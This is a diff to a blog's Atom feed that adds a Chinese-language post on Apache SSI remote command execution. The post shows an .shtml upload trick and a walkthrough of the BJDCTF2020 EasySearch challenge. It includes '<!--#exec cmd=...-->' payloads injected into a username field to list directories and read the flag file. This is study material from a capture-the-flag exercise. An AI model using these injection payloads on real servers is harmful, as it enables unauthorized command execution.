@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-12-27T05:13:15.580Z</updated>
+  <updated>2023-12-31T13:42:00.711Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SSI远程命令执行</title>
+    <link href="http://example.com/2023/12/31/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <id>http://example.com/2023/12/31/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
+    <published>2023-12-31T13:25:44.000Z</published>
+    <updated>2023-12-31T13:42:00.711Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前没有听过这个漏洞，在做BUUCTF一道题中发现了，学习一下。</p><h1 id="Apache-SSI远程命令执行漏洞"><a href="#Apache-SSI远程命令执行漏洞" class="headerlink" title="Apache SSI远程命令执行漏洞"></a>Apache SSI远程命令执行漏洞</h1><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。但是如果目标服务器<strong>开启了SSI和CGI支持</strong>，我们可以上传一个shtml文件，并构造命令执行来进行利用。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传shell.shtml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd==&quot;ls&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231213248547.png" alt="image-20231231213248547"></p><p>访问，成功执行</p><p><img src="/../images/image-20231231213331385.png" alt="image-20231231213331385"></p><p>参考链接：</p><p><a href="https://www.hacking8.com/bug-product/Apache-SSI/Apache-SSI-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">Apache-SSI-远程命令执行漏洞</a></p><h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>前面不再赘述，这里从登录成功开始。</p><p>如图，正确的账号密码登录</p><p><img src="/../images/image-20231231212333674.png" alt="image-20231231212333674"></p><p>可以发现生成了一个shtml文件</p><p>访问</p><p><img src="/../images/image-20231231212351223.png" alt="image-20231231212351223"></p><p>观察一下，admin是username的值，被输出，结合会生成shtml文件，猜想会不会存在SSI远程命令执行漏洞</p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&amp;password=20206666</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231212208158.png" alt="image-20231231212208158"></p><p>访问，可以看到flag文件</p><p><img src="/../images/image-20231231212146502.png" alt="image-20231231212146502"></p><p>读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231214137226.png" alt="image-20231231214137226"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前没有听过这个漏洞，在做BUUCTF一道题中发现了，学习一下。&lt;/p&gt;
+&lt;h1 id=&quot;Apache-SSI远程命令执行漏洞&quot;&gt;&lt;a hr</summary>
+      
+    
+    
+    
+    
+    <category term="ctf RCE" scheme="http://example.com/tags/ctf-RCE/"/>
+    
+  </entry>
   
   <entry>
     <title>Fast destruct</title>
